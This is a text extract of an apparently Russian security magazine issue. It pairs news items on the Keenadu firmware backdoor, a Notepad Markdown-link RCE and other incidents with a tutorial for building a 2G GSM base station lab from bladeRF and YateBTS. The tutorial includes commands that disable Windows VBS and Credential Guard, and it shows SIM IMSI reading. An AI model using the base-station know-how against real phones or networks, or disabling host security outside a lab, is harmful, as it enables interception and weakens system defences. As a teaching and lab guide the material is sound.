   зараженные «из коробки» гаджеты.
    По состоянию на февраль 2026 года решения компании зафиксировали
  более 13 тысяч атакованных Keenadu устройств. Больше всего пострадавших
   находятся в России, Японии, Германии, Бразилии и Нидерландах.
      Схема встраивания бэкдора в прошивку выглядит следующим образом:
   вредоносная     статическая     библиотека     libVndxUtils.a     линкуется
  с libandroid_runtime.so и заражает процесс Zygote — родительский для всех
   приложений в системе. Копия бэкдора оказывается в адресном пространстве
   каждого запущенного приложения, что делает изоляцию приложений друг
   от друга бессмысленной.
      Исследователи  отследили  путь  заражения  на  примере  планшетов
   Alldocube, а именно модели Alldocube iPlay 50 mini Pro (T811M). Выяснилось,
   что вредоносная зависимость попала в репозиторий с исходным кодом про‐
   шивки еще на этапе сборки. Подчеркивается, что зараженные прошивки име‐
  ли действительную подпись, а все последующие обновления для пострадав‐
  ших моделей также были заражены (в том числе выпущенные уже после того,
   как вендор публично признал проблему).
     Keenadu встречается и в устройствах других производителей, и, по зак‐
  лючению исследователей, речь идет об атаке на цепочку поставок: скомпро‐
   метированная зависимость попала в исходники прошивки, и производители,
   вероятно, даже не подозревали о заражении.
      Стоит  отметить, что при этом Keenadu не  активируется, если язык
  или часовой пояс устройства жертвы связаны с Китаем.
      Архитектура Keenadu построена по клиент‑серверной модели: серверная
   часть (AKServer) работает в привилегированном процессе system_server, кли‐
   ентская (AKClient) встраивается во все остальные приложения. Это дает опе‐
   раторам малвари практически неограниченный контроль над устройством:
  они могут выдавать и отзывать разрешения у любого приложения, получать
   данные геолокации, IMEI, MAC-адрес и прочую информацию об устройстве.
      Отмечается, что в новых версиях Android доставка APK реализована через
   установочные сессии. Вероятно, таким образом малварь пытается обойти
   ограничения, введенные в последних версиях ОС: приложения из сторонних
   источников не могут получить доступ к опасным разрешениям, в частности
   к «специальным возможностям».
    По словам специалистов, бэкдор применяется для реализации нескольких
   криминальных схем. Основная — рекламное мошенничество путем скрытого
   взаимодействия с рекламными элементами и монетизации установок при‐
   ложений (путем имитации переходов из рекламы).
     Кроме того, отдельный модуль для Chrome перехватывает поисковые зап‐
  росы пользователя (включая набранные в режиме инкогнито) и может под‐
  менять поисковик.
      Отдельный загрузчик нацелен на приложения Amazon, SHEIN и Temu и,
   согласно жалобам пользователей, может без ведома владельца устройства
   добавлять товары в корзины.
     Особого внимания заслуживает случай, когда Keenadu был найден внутри
   системного приложения для распознавания лиц. Теоретически это давало
   злоумышленникам доступ к биометрическим данным жертв.
     Помимо   этого,  в  ряде  прошивок  бэкдор  был  встроен  не  в
   libandroid_runtime.so, а в отдельные системные приложения. Также вредонос
  был найден как в некоторых неофициальных источниках, так и в магазинах
  Google Play и Xiaomi GetApps.
    В официальном магазине Google Play нашли сразу несколько зараженных
   малварью приложений для умных камер, общее количество загрузок которых
   превышало 300 тысяч. В настоящее время они уже удалены.





   Также  сообщается, что в ходе исследования удалось установить связь
  Keenadu с другими крупными Android-ботнетами: Triada , BADBOX и Vo1d .
  К примеру, выяснилось, что BADBOX скачивал один из модулей Keenadu,
  а код обоих вредоносов имеет заметные сходства (хотя различий тоже
   немало). Из‑за этого исследователи предполагают, что авторы Keenadu вдох‐
   новлялись исходниками BADBOX.
     Дмитрий Калинин, старший эксперт по кибербезопасности «Лаборатории
   Касперского», комментирует:


          Предустановленное вредоносное ПО — проблема, которая остается
           актуальной для множества Android-устройств. Ничего не подозрева‐ «
       ющие пользователи могут случайно приобрести уже зараженные гад‐
         жеты. Поэтому, чтобы обезопасить свои устройства и данные, необ‐
        ходимо устанавливать защитные программы, способные обнаруживать
          вредоносное ПО. Мы  предполагаем, что  производители не  знали
        о компрометации цепочки поставок, в результате которой Keenadu
          проник на  устройства,  поскольку  зловред  имитировал легитимные
          компоненты системы. В свете таких угроз важно, чтобы производите‐
        ли тщательно контролировали каждый этап производства устройств
        и проверяли, что прошивка не заражена.                 »
   Удалить Keenadu штатными средствами Android невозможно: в современных
   версиях ОС системный раздел, где находится libandroid_runtime.so, смон‐
  тирован в режиме «только для чтения». Единственный вариант — найти
  и установить чистую прошивку от производителя (если таковая существует)
  или перепрошить устройство самостоятельно. До замены прошивки в ком‐
  пании рекомендуют вовсе отказаться от использования зараженных устрой‐
   ств.


  30 ЛЕТ ТЮРЬМЫ ПОЛУЧИЛ ВЛАДЕЛЕЦ ДАРКНЕТ-
  МАРКЕТПЛЕЙСА INCOGNITO
   Суд в Нью‑Йорке приговорил 24-летнего тайваньца Руй‑Сяна Линя (Rui-Siang Lin) к 30 годам
   лишения свободы за управление Incognito — одной из крупнейших площадок по торговле нар‐
   котиками в даркнете. Судья назвала это дело самым серьезным наркопреступлением за 27 лет
    своей карьеры.


   Маркетплейс работал с октября 2020-го по март 2024 года. За это время через него продали
   более тонны наркотиков и обработали свыше 640 тысяч транзакций для 400 тысяч покупа‐
   телей и 1,8 тысячи продавцов. Общая выручка площадки превысила 83,6 миллиона дол‐
  ларов США .

   Суд также обязал конфисковать у Лина 105 045 109 долларов США и назначил пять лет над‐
   зора после освобождения.





 RCE-УЯЗВИМОСТЬ
 В «БЛОКНОТЕ»
   Разработчики  Microsoft  исправили  уязвимость  в  «Блокноте»  (Notepad)
  для Windows 11. Проблема позволяла запускать локальные или удаленные
   файлы через Markdown-ссылки, что могло привести к удаленному выпол‐
  нению кода.
    С выходом Windows 11 компания Microsoft решила упразднить WordPad
  и серьезно переработала классический «Блокнот», превратив его из прос‐
   того текстового редактора в инструмент с поддержкой форматирования
  и Markdown. Теперь «Блокнот» умеет открывать и редактировать файлы
   в формате .md, а Markdown-ссылки в нем становятся кликабельными.
     Именно эта функциональность и стала вектором атаки. В рамках февраль‐
   ского «вторника обновлений» Microsoft раскрыла информацию об уязвимости
  CVE-2026-20841 .
    В бюллетене безопасности Microsoft сообщается:


           Некорректная нейтрализация специальных элементов, используемых
         в командах, в приложении Windows Notepad позволяет неавторизован‐ «
        ному злоумышленнику удаленно выполнить код.                 »
  По словам разработчиков, для эксплуатации бага достаточно обманом зас‐
   тавить пользователя кликнуть по вредоносной ссылке в Markdown-файле,
   открытом в «Блокноте»:


          Вредоносный код выполняется в контексте прав текущего пользовате‐
          ля, открывшего Markdown-файл, и дает атакующему те же привилегии, «
         что у этого пользователя.                 »
   «Блокнот» в Windows 11 обновляется через Microsoft Store, так что патч рас‐
   пространится автоматически и уязвимость вряд ли успеет нанести серьезный
  ущерб.
      Публикация  информации  об  этой  проблеме  привлекла  внимание
   ИБ‑сообщества. Исследователи разобрались в механизме  эксплуатации
  бага и выяснили, что достаточно создать файл .md со ссылками вида file://,
   указывающими на исполняемые файлы, или использовать специальные URI
   вроде ms-appinstaller://.





   Если   пользователь   открывал   такой   файл   в   «Блокноте»    вер‐
  сии 11.2510 или более ранней, переключался в режим Markdown и кликал
  по ссылке, указанная программа запускалась без какого‑либо предупрежде‐
  ния со стороны Windows. Более того, ссылки могли указывать на файлы в уда‐
   ленных SMB-шарах, что расширяло возможности для атаки.


                                        Продолжение статьи →
← Начало статьи





   Microsoft исправила проблему, добавив диалог подтверждения для любых
   ссылок, использующих  протоколы, отличные от  http:// и  https://. Теперь
  при клике на ссылки с URI-схемами file:, ms-settings:, ms-appinstaller:, mailto:
  и другими «Блокнот» будет отображать предупреждение.





   Однако теперь специалисты задаются вопросом, почему Microsoft изначаль‐
  но не  ограничила набор допустимых  протоколов. Ведь злоумышленник
   по‑прежнему может убедить пользователя нажать «Да» в новом диалоговом
  окне с помощью социальной инженерии.


  27 БИТ ЭНТРОПИИ — НАДЕЖНОСТЬ ПАРОЛЕЙ,
  СГЕНЕРИРОВАННЫХ LLM
   Специалисты компании Irregular 50 раз попросили ChatGPT, Claude и Gemini сгенерировать
   пароль из 16 символов с заглавными и строчными буквами, цифрами и спецсимволами.

   Из 50 паролей, созданных Claude, только 30 были уникальными — 20 дублировались и 18
   из них оказались одной и той же строкой.


   У всех трех моделей обнаружились характерные паттерны: совпадающие начальные и конечные
   символы, предсказуемые последовательности.

   По формуле Шеннона реальная энтропия LLM-паролей составила около 27 бит (по символьной
    статистике) и около 20 бит (по логарифмическим вероятностям). Тогда как по‑настоящему
    случайный пароль той же длины дает 98–120 бит . На практике это означает, что пароль от ИИ
   можно взломать за несколько часов даже на старом железе.





    Исследователи подчеркивают: проблему нельзя решить «правильным промптом» — LLM по при‐
   роде оптимизированы на предсказуемость, а не на случайность. Для генерации паролей
   рекомендуют использовать специализированные инструменты.





 ИИ-СКАНДАЛ
 В HACKERONE
   Багбаунти‑платформа HackerOne оказалась в центре скандала: исследова‐
   тели заподозрили, что компания может использовать их отчеты об уязвимос‐
   тях для обучения ИИ‑моделей. В итоге отвечать специалистам пришлось CEO
   компании Каре Спраг (Kara Sprague).
     Поводом для случившегося послужила запущенная в прошлом месяце
  платформа Agentic PTaaS — новый продукт HackerOne, который компания
   описывает  как  «непрерывную  проверку  безопасности  с  автономными
   ИИ‑агентами и человеческой экспертизой». В описании отдельно подчерки‐
   валось, что агенты «проходят обучение и совершенствуются на проприетар‐
  ной базе знаний об эксплоитах, накопленной HackerOne за годы тестирова‐
  ния реальных корпоративных систем».
    В итоге багхантеры задались очевидным вопросом: откуда взялись эти
   данные для обучения? Бывший исследователь под ником YShahinzadeh писал:


         Как бывший багхантер на H1, надеюсь, что вы не использовали мои
         репорты для обучения ваших ИИ‑агентов. «                 »
   Другой  специалист под ником  AegisTrail  сформулировал  свое  мнение
  еще мрачнее:


          Когда white hat’ы чувствуют, что правовая система работает против
          них, привлекательность темной стороны становится вопросом злости «
        и выживания, а не этики.                 »
  На ситуацию была вынуждена отреагировать CEO HackerOne Кара Спраг,
  которая дала развернутый комментарий о ситуации через LinkedIn. Глава
   компании заявила:


        HackerOne не обучает генеративные ИИ‑модели — ни внутри ком‐
         пании, ни через сторонних провайдеров — на отчетах исследователей «
        или конфиденциальных данных клиентов.                 »
   Также она подчеркнула, что отчеты специалистов не используются для тонкой
   настройки и иного улучшения моделей, а сторонним поставщикам моделей
   прямо  запрещено  «хранить  или  использовать  данные  исследователей
  или клиентов для обучения собственных моделей».
    По словам Спраг, агентная ИИ‑система HackerOne Hai создана «для уско‐
  рения получения результатов, таких как верифицированные отчеты, исправ‐
  ления ошибок и выплаченные вознаграждения, при сохранении целостности
  и конфиденциальности вклада исследователей».
      Скандал подтолкнул к публичным заявлениям и конкурентов HackerOne.
   Так, основатель и глава компании Intigriti Стейн Янс (Stijn Jans) сообщил, что
   хочет четко обозначить позицию компании, и заверил исследователей: «Ваша
  работа принадлежит вам». По его словам, компания использует ИИ только
  для взаимной выгоды исследователей и заказчиков, чтобы усилить челове‐
   ческую  креативность и обеспечить более быструю и точную  обработку
   результатов.
      Политика Bugcrowd в отношении ИИ уже зафиксирована в условиях
   использования: третьим сторонам запрещено обучать на данных исследова‐
  телей и клиентов любые ИИ и LLM-модели. Также платформа обязывает
  самих исследователей соблюдать правила при работе с генеративным ИИ:
   автоматизированные или непроверенные результаты не принимаются к рас‐
   смотрению.
     HackerOne,  в  свою   очередь,   анонсировала   обновление  Terms
  and Conditions. Судя по всему, скандал убедил компанию зафиксировать свои
  обещания письменно.





 ОШИБКА ЦЕНОЙ
 620 ТЫСЯЧ BTC
   Южнокорейская криптовалютная биржа Bithumb случайно отправила своим
   пользователям 620 тысяч биткоинов (около 40 миллиардов долларов США)
   вместо небольших промовыплат.
     Вечером 6 февраля 2026 года на бирже Bithumb запустили обычную про‐
   моакцию с символическими призами — около 2000 вон (примерно 1,4 дол‐
  лара США). Однако что‑то пошло не так на уровне конфигурации систем.
   Вместо скромных наград сотни пользователей получили по 2000 биткоинов
   каждый.
     За считаные минуты на 695 аккаунтов было зачислено около 620 тысяч
  BTC. По курсу на тот момент речь шла примерно о 40 миллиардах долларов
  США. Некоторые владельцы неожиданного богатства спешно попытались
   продать  биткоины.  Резкий  всплеск  предложения  обрушил  цену  BTC
  на Bithumb примерно на 17% по сравнению с другими площадками, хотя внут‐
  реннее падение длилось недолго.
      Представители  биржи  отреагировали  на  сбой  быстро.  Примерно
  через 35 мин после начала инцидента торговля и вывод средств на зат‐
  ронутых аккаунтах были заблокированы. В итоге почти все биткоины удалось
   вернуть. Bithumb заявила, что восстановила уже 99,7% от ошибочно отправ‐
  ленных пользователям 620 тысяч BTC.
    В компании подчеркнули, что инцидент произошел из‑за внутренней опе‐
   рационной ошибки, а не из‑за взлома или внешней атаки:


          Хотим прояснить: этот инцидент не связан с какими‑либо внешними
          хакерскими атаками или нарушениями безопасности и не создает «
         проблем для защиты  систем или  управления  активами  клиентов.
         Средства  пользователей  находятся под надежной защитой,  как и
          прежде, а торговые операции, депозиты и вывод средств работают
         в обычном режиме.                 »
   Однако южнокорейские регуляторы жестко отреагировали на случившееся.
   После инцидента представители финансового надзора страны провели экс‐
   тренные совещания. Чиновники выразили обеспокоенность уязвимостями
   в системах криптотрейдинга и дали понять, что могут организовать внеп‐
  лановые проверки работы Bithumb, если будут выявлены новые нарушения.
      Дело в том, что это не первый случай, когда Bithumb привлекает внимание
   властей и СМИ, а также страдает от хакерских атак.
   • Первый взлом Bithumb произошел еще в июле 2017 года, и тогда со сче‐
     тов ресурса было похищено неизвестное количество Bitcoin и Ethereum
     (общей стоимостью несколько миллионов долларов).
   • Второй взлом произошел летом 2018 года, и злоумышленники похити‐
     ли 35 миллиардов вон, то есть около 31 миллиона долларов в криптовалю‐
      те (преимущественно Ripple).
   • Третий взлом произошел в 2019 году. По данным исследователей, тогда
     с горячего кошелька биржи было выведено более 3 миллионов токенов
    EOS (около 13 миллионов долларов) и 20 миллионов токенов Ripple (при‐
      мерно 6 миллионов долларов). Взломщики вывели похищенные средства
     в различные биржи и обменщики, включая Huobi, HitBTC, WB, EXmo.


  СОЗДАТЕЛЬ CLAUDE CODE О ПРОФЕССИИ
 ПРОГРАММИСТА





   Борис Черни (Boris Cherny), создатель Claude Code в компании Anthropic, дал интервью под‐
   касту Y Combinator Lightcone. Черни заявил, что 2026 год принесет «безумные» перемены
   в ИИ‑индустрии и радикально изменит работу разработчиков. По его словам, уже сейчас
   от 70 до 90% кода в Anthropic пишет ИИ, а Claude Code на 90% написан самим собой.
       Черни рассказал, что недавно отправил 22 пул‑реквеста, в которых каждая строчка была
    сгенерирована→  Я думаю,ИИ:  что для меня написание кода — практически решенная задача,
         и скоро так будет для всех, независимо от области. Думаю, скоро мы увидим,
           как  должность  инженер‑программист  постепенно  исчезнет.  Возможно, ее
          заменит билдер, продакт‑менеджер, или мы сохраним старое название просто
         по привычке.




  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   Более 220 тысяч инстансов OpenClaw доступны через интернет


   Разработчиков SmarterMail взломали через уязвимость в их продукте


  ЦБ РФ создаст единую БД карт российских пользователей


    Аккаунты Telegram угоняют через вредоносные веб‑приложения


   СМИ: пользователи не могут войти в «Госуслуги» без мессенджера Max


   Госдума одобрила в первом чтении законопроект о создании базы IMEI


   Операторов обязали отключать связь по требованию ФСБ


   Обнаружен первый инфостилер, похитивший секреты из OpenClaw


   Claude Opus 4.6 нашел более 500 уязвимостей в опенсорсных библиотеках


  В Microsoft создали сканер для обнаружения бэкдоров в LLM
COVER STORY





Мобильная связь — одна из самых инте‐
ресных и сложных инженерных систем: тут
тебе и радиоканал, и сигнализация, и иден‐
тификация  абонента,  и  маршрутизация                                                                            qeewqq
                                                                                  qeewwqqq@gmail.comвызовов. Эта статья — про изучение прин‐
ципов GSM (2G) и сборку лабораторного
стенда для экспериментов и отладки.


Сотовая связь прошла длинный и тернистый путь от аналоговых сетей
типа 1G до сегодняшнего 5G. В этой статье речь пойдет про 2G/GSM — вто‐
рое поколение сетей, которое местами все еще используется.
  Для нас важно то, что стандарт проще, чем более современные, требова‐
ния к оборудованию не такие высокие, а поддерживается он до сих пор всем
оборудованием. 2G, в отличие от 3G и более современных поколений, про‐
ектировался без учета требований безопасности: в нем нет взаимной аутен‐
тификации, а криптография почти смехотворно слаба даже в сравнении с 3G,
так что потренироваться на таком полигоне интересно.
  По мере распространения сетей четвертого и пятого поколений операто‐
ры стараются постепенно выводить 2G/3G из эксплуатации, чтобы повысить
безопасность сетей и  снизить  количество  старого  оборудования. Тем
не менее 2G еще жив и активно используется для нужд IoT и покрытия хоть
какой‑то связью удаленных и малонаселенных районов.
  В разных странах сроки отключения сетей старых поколений очень сильно
отличаются: где‑то 2G начали выводить из эксплуатации с начала 2020-х
годов, а где‑то это делать еще даже не планируют.


ПОДГОТОВКА

Перед запуском стенда необходимо подготовить систему и SDR, которая
и будет отвечать за радиочасть базовой станции. Я буду использовать SDR
bladeRF A4, а ПО YateBTS будем запускать на виртуальной машине VMware
с Ubuntu 24 внутри. Для корректной работы нашей базовой станции рекомен‐
дуется создавать машину не менее чем с восемью ядрами и 8 Гбайт опе‐
ративной памяти. Размер диска не особо важен — я выделил 100 Гбайт,
но можно и меньше.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону. Представленная информация может
                            рассматриваться    только   в    теоретическом
                      или историческом контексте и не предназначена
                       для практического применения.


Теперь нужно настроить хостовую систему. На Windows 11 корректной работе
SDR внутри виртуалки будет мешать Virtualization Based Security, которая
ограничивает производительность виртуальной машины для обеспечения
лучшей безопасности. Поскольку для корректной работы базовой станции
тайминги передачи очень важны, нужно отключить все, что может на нее вли‐
ять. Для отключения VBS в терминале от администратора выполни


reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v
EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

Также отключаем Credential Guard, который может держать VBS включенной:


reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t
 REG_DWORD /d 0 /f


reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v
LsaCfgFlags /t REG_DWORD /d 0 /f

И отключаем HyperV:


bcdedit /set hypervisorlaunchtype off

Дальше перезагружаем ПК и переходим к следующему пункту.



После экспериментов не забудь включить все обратно:


 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v
 EnableVirtualizationBasedSecurity /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v
 LsaCfgFlags /f
 reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v
  LsaCfgFlags /f
 bcdedit /set hypervisorlaunchtype auto




Теперь идем в настройки виртуальной машины в VMware, заходим в USB
Controller и выставляем USB compatibility в USB 3.1. Это нужно для поддержа‐
ния скорости обмена данными между bladeRF и виртуальной машиной. Ско‐
рость обмена данными критична для YateBTS: если какие‑то куски будут опаз‐
дывать, то клиентское устройство потом не сможет синхронизироваться
с базовой станцией.
   Теперь включаем виртуальную машину, подключаем bladeRF через USB
3.0 и прокидываем его в VMware. Чтобы убедиться, что все работает именно
по 3.0, посмотрим все USB-устройства в Ubuntu:


  root@ubuntu:/home/ubuntu# lsusb
  Bus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
  Bus 004 Device 002: ID 2cf0:5250 Nuand LLC bladeRF 2.0 micro <-- bladeRF


  root@ubuntu:/home/ubuntu# lsusb -t
  /:  Bus 004.Port 001: Dev 001, Class=root_hub, Driver=xhci_hcd/4p,
  20000M/x2
      |__ Port 001: Dev 002, If 0, Class=Vendor Specific Class, Driver=
  [none], 5000M <-- bladeRF

Находим bladeRF в выводе lsusb , далее командой lsusb -t проверим ско‐
рость передачи данных. Как видишь, у меня bladeRF подключен к 3.0 root hub
и имеет скорость 5000М (5 Гбит/с).
   Когда с программной частью покончено, переходим к SDR. Тут все просто:
нужно только включить ее и подобрать антенны. В зависимости от частот,
которые программно настраиваются в YateBTS, нужны разные антенны, но в
домашнем сетапе на расстояниях в десятки сантиметров выбор антенны
упрощается — я использовал четыре простые телескопические антенны,
которые можно найти в интернете за копейки. Если бы у нас был более мас‐
штабный тест, пришлось бы использовать специальные GSM-антенны, соз‐
данные для этих частот.
   Второе требование в подготовке SDR — хороший кабель USB 3.0. BladeRF
может работать и в режиме USB 2.0, но тут критически важно проверить, что
твой кабель поддерживает USB 3.0, так как это сильно повлияет на скорость
передачи и синхронизацию.





                              Тестовый стенд

Последняя  крупная часть лаборатории — программируемые  SIM-карты.
Вариантов, какие использовать, тут хватает — вот, например, официальный
от YateBTS. Я же пошел более сложным путем и заказал набор карт
для работы с 5G от sysmocom вместе с программатором и SIMTrace2 —
устройством, которое может снифать данные между сим‑картой и модемом.





                            Тестовые SIM-карты

Сами симки настраивать никак не нужно, все необходимые данные с них
для работы в 2G-сетях мы прочитаем позже. Сегодня нас интересуют только
номера IMSI — это уникальный идентификатор, по которому определяется
симка и по которому мы будем разрешать клиентам подключаться к нашей
лаборатории.


           WARNING

                        IMSI и другие параметры SIM-карты относятся
                          к  данным,  используемым  для  идентификации
                             абонента в сети связи. Работа с такими данными
                         допустима только в отношении собственных тес‐
                       товых SIM-карт, предназначенных для лаборатор‐
                      ных  экспериментов.  Использование  SIM-карт
                         реальных операторов без их согласия и вне раз‐
                        решенной тестовой среды может нарушать тре‐
                          бования законодательства о связи и тайне ком‐
                         муникаций.



УСТАНОВКА

Собрать стенд — это только половина задачи. Вторая — установить и настро‐
ить весь софт. Это мы сейчас и разберем.


libbladerf
Начать ковыряния стоит с драйвера для bladeRF и утилит, необходимых
для работы с SDR. В зависимости от твоей системы есть два варианта уста‐
новки: из репозиториев либо напрямую с GitHub . Я буду собирать напрямую
из репозитория, чтобы получить самую последнюю версию. Перед сборкой
собственно драйвера ставим сборочное окружение:


sudo apt install -y build-essential cmake libusb-1.0-0-dev pkg-
config curl libcurl4-openssl-dev subversion autoconf doxygen
graphviz kdoc-tools

Далее собираем все необходимое для работы с bladeRF:


git clone https://github.com/Nuand/bladeRF.git ./bladeRF
cd bladeRF
mkdir build
cd build
cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr/local
-DINSTALL_UDEV_RULES=ON ../

Проверяем, есть ли наш пользователь в группе plugdev :


  $ groups


  <user> adm cdrom sudo dip plugdev lpadmin sambashare

Если есть, пропускаем следующий пункт и идем дальше, а если нет:


  $ groups
  <user> wheel
  $ sudo groupadd bladerf
  $ sudo usermod -a -G bladerf <user>

Выходим из сессии или просто делаем ребут:


  $ groups
  jon wheel bladerf

Теперь же переходим к сборке и установке:


make && sudo make install && sudo ldconfig

Когда все завершится, проверяем работу следующей командой при подклю‐
ченном bladeRF:


  ubuntu@ubuntu:~$ bladeRF-cli -p
  `  Description:    Nuand bladeRF 2.0  Backend:        libusb  Serial:
  XXX  USB Bus:        4  USB Address:    7`
Если все установилось верно, ты увидишь данные своего bladeRF.


YateBTS
Теперь соберем саму базовую станцию YateBTS. Тут вариантов у нас не очень
много, потому что при использовании bladeRF необходимо собирать YateBTS,
оптимизированную под эту SDR. К счастью, разработчики уже всё сделали
за нас и выложили на официальном сайте nuand . Скачиваем последний релиз
(на текущий момент это RC-3 ) и распаковываем:


mkdir bts
cd bts
wget https://nuand.com/downloads/yate-rc-3.tar.gz
tar xzvf yate-rc-3.tar.gz

В итоге у тебя в папке будут следующие файлы:


ubuntu@ubuntu:~/bts$ ls -l


total 23940
-rw-r--r--  1 ubuntu ubuntu  3571462 Oct  5  2021 hostedx115.rbf
-rw-r--r--  1 ubuntu ubuntu  1191788 Oct  5  2021 hostedx40.rbf
-rw-r--r--  1 ubuntu ubuntu  2632660 Oct  5  2021 hostedxA4.rbf
-rw-r--r--  1 ubuntu ubuntu  4244820 Oct  5  2021 hostedxA5.rbf
-rw-r--r--  1 ubuntu ubuntu 12858972 Oct  5  2021 hostedxA9.rbf
drwxr-xr-x 13 ubuntu ubuntu     4096 Dec 15 17:34 yate
drwxr-xr-x  8 ubuntu ubuntu     4096 Dec 15 17:36 yatebts

Как  видишь,  в  архив  разработчики  положили не  только сами  файлы
для работы с YateBTS, но и специальный образ FPGA для bladeRF, оптимизи‐
рованный для работы с Yate. Пока оставим эти файлы в сторонке и займемся
компиляцией самой базовой станции. Собираем ядро Yate:


cd yate
./autogen.sh
./configure --prefix=/usr/local

Не пугайся, если одна из этих команд попросит что‑то доустановить, — прос‐
то сделай это через apt. И вообще возьми за привычку всегда читать вывод
всех команд — это сильно упрощает исправление всяких ошибок. После кон‐
фигурации собираем и устанавливаем проект:


make
sudo make install-noapi
sudo ldconfig

Теперь очередь YateBTS. Идем на директорию назад, переходим в yatebts
и запускаем команды


cd ../yatebts
./autogen.sh
./configure --prefix=/usr/local
make
sudo make install
sudo ldconfig

Все готово, можно проверять! Запускаем yate :


  ubuntu@ubuntu:~/bts$ yate -V
  Yate 6.2.1 devel1 r

Если на экране видна версия ядра Yate, базовая станция готова к работе.
   Вернемся теперь ненадолго к нашей SDR. Чтоб два раза не вставать, сра‐
зу загрузим прошивку для FPGA в память bladeRF:


  ubuntu@ubuntu:~$ bladeRF-cli -l hostedxA4-latest.rbf
  Loading FPGA...
  Successfully loaded FPGA bitstream!

И пишем в постоянную память, чтобы прошивка переживала перезагрузку:


  ubuntu@ubuntu:~$ bladeRF-cli -L hostedxA4-latest.rbf
  Writing FPGA to flash for autoloading...
  [INFO @ host/libraries/libbladeRF/src/backend/usb/usb.c:504] Erasing 41
  blocks starting at block 4
  ...
  [INFO @ host/libraries/libbladeRF/src/backend/usb/usb.c:636] Done
  reading 10284 pages
  Successfully wrote FPGA bitstream to flash!

На этом настройка bladeRF завершена.


             INFO

                     На  самом  деле  необязательно  использовать
                         именно      специально      оптимизированные
                       для  YateBTS  образы  для FPGA —  подойдут
                      и общего назначения, главное — использовать
                            актуальные (читай: последние).



PySIM
Для получения информации о симке и ее настройках нам понадобится либа
PySIM. У YateBTS есть и свой GUI, который работает с SIM-картами через
встроенный веб‑интерфейс, но его использовать не получится. Чтобы уста‐
новить PySIM, клонируем репозиторий из Osmocom:


git clone https://gitea.osmocom.org/sim-card/pysim.git

Устанавливаем все зависимости:


sudo apt-get install --no-install-recommends \
    pcscd libpcsclite-dev \
    python3 \
    python3-setuptools \
    python3-pycryptodome \
    python3-pyscard \
    python3-pip

И устанавливаем сам PySIM:


cd pysim
pip3 install --user -r requirements.txt

После этого станут доступны скрипты внутри директории. Запускай pysim-
read с нужным ключом для своего адаптера, в моем случае PCSC-устройство
с ID 0:


  ubuntu@ubuntu:~/pysim$ python3 pySim-read.py -p 0
  Using reader PCSC[VMware Virtual USB CCID 00 00]
  Reading ...
  Autodetected card type: sysmoISIM-SJA5
  ICCID: 8949440000001239597
  IMSI: 999700000123959
  GID1: ffffffffffffffffffff
  GID2: ffffffffffffffffffff
  SMSP:
  ffffffffffffffffffffffffffffffffffffffffffffffffe1ffffffffffffffffffffff
  ff06815384090067ffffffffff000000
  SPN: Not available
  Show in HPLMN: False
  Hide in OPLMN: False
  PLMNsel:
  ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  ffffffffffffffffffffffffffffffffffffffffffffffff

Как видно, SIM-карта успешно прочиталась и мы получили ее IMSI. Этот же
IMSI написан и на самой симке.


НАСТРОЙКА YATEBTS

Когда сама лаборатория собрана, надо настроить ее компоненты, чтобы они
работали вместе. Здесь я покажу полную конфигурацию тестовой системы
для каждой ее части, кроме SIM-карты, потому что там настраивать ничего
не нужно. Отдельно остановимся на настройке GUI для управления базовой
станцией и разберем, какие ошибки могут возникнуть при настройке самой
станции и bladeRF (и как их исправить, конечно, тоже).
   Начнем с создания отдельной группы пользователей для Yate:


sudo addgroup yate

После этого добавляем текущего пользователя в группу yate , чтобы не было
проблем с правами:


sudo usermod -a -G yate <user>




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИCOVER STORY
          ЭТО БАЗА!
           КАК ПОДНЯТЬ СВОЮ БАЗОВУЮ
          СТАНЦИЮ GSM С ПОМОЩЬЮ
                                YATEBTS




Теперь нужно убедиться, что пользователь может получить прямой доступ
к bladeRF без привилегий root. Для этого создадим правило udev, которое
будет монтировать устройство от имени группы yate . Правила udev добав‐
ляются в отдельные файлы в каталоге /etc/udev/rules.d/ , куда я и положил
90-yate.rules со следующим содержимым:


# nuand bladeRF
ATTR{idVendor}=="1d50", ATTR{idProduct}=="6066", MODE="660" , GROUP=
"yate"

Это правило буквально означает «устройство с VID:PID 1d50:6066 нужно
смонтировать от имени группы yate и дать права 660».
   Далее подгружаем новые файлы конфигурации в udev:


sudo udevadm control --reload-rules

Если до этого bladeRF уже был подключен, нужно его переподключить, чтобы
монтирование произошло по новым правилам.
   Вернемся к нашим баранам Yate. Создадим два файла конфигурации
для SNMP и TMSI:


sudo touch /usr/local/etc/yate/snmp_data.conf /usr/local/etc/yate/
tmsidata.conf

И изменим группу владельца файлов на yate :


sudo chown root:yate /usr/local/etc/yate/*.conf
sudo chmod g+w /usr/local/etc/yate/*.conf

После установки все конфиги будут находиться в /usr/local/etc/yate .
Для дальнейшей настройки поднимем веб‑интерфейс, который поставляется
в комплекте с YateBTS. Для его работы понадобятся еще Apache и PHP:


sudo apt install apache2 php

Далее, в зависимости от того, с каким SDR ты работаешь, нужно выбрать раз‐
ные папки с веб‑интерфейсом (в моем случае это /usr/local/share/yate/
nipc_web/). Создаем ссылку на эту папку из /var/www/html :


cd /var/www/html
sudo ln -s /usr/local/share/yate/nipc_web/ nipc

Перезапускаем Apache и добавляем его в автозапуск:


sudo systemctl restart apache2
sudo systemctl enable apache2


Чиним веб-интерфейс
А вот теперь начинается самое интересное: веб‑интерфейс тут довольно ста‐
рый и толком не обновлялся уже не один релиз, из‑за чего он не работает
